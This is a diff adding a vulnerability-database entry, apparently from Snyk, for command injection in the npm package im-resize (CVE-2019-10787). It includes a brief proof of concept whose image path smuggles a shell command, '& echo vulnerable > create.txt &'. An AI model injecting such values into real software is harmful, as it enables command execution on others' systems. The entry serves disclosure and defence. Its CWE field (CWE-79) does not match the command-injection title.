@@ -1,0 +1,28 @@
+---
+- id: snykio:npm:im-resize:544183
+  title: Command Injection
+  description: "[im-resize][1] is a efficient image resize with support for multiple\nthumbnail
+    configurations using ImageMagick\\'s convert command.\n\nAffected versions of
+    this package are vulnerable to Command Injection.\nThe `cmd` argument used within
+    `index.js,` can be controlled by user\nwithout any sanitization.\n\n### PoC by
+    JHU System Security Lab   {#poc-by-jhu-system-security-lab}\n\n    var root =
+    require('im-resize')\n    var image = {\n    \"path\": \"& echo vulnerable > create.txt
+    &\"\n    \n    }\n    var output ={\n    \"versions\":[]\n    }\n    root(image,output,function(){});\n\n\n\n[1]:
+    https://www.npmjs.com/package/im-resize\n"
+  affected_package: im-resize
+  vulnerable_versions:
+  - "*"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2019-10787
+  cwe:
+  - CWE-79
+  disclosed_date: 2020-02-04
+  created_date: 2020-02-04
+  last_modified_date: 2020-02-04
+  credit:
+  - JHU System Security Lab
+  references:
+  - https://github.com/Turistforeningen/node-im-resize/commit/de624dacf6a50e39fe3472af1414d44937ce1f03
+  source_url: https://snyk.io/vuln/SNYK-JS-IMRESIZE-544183
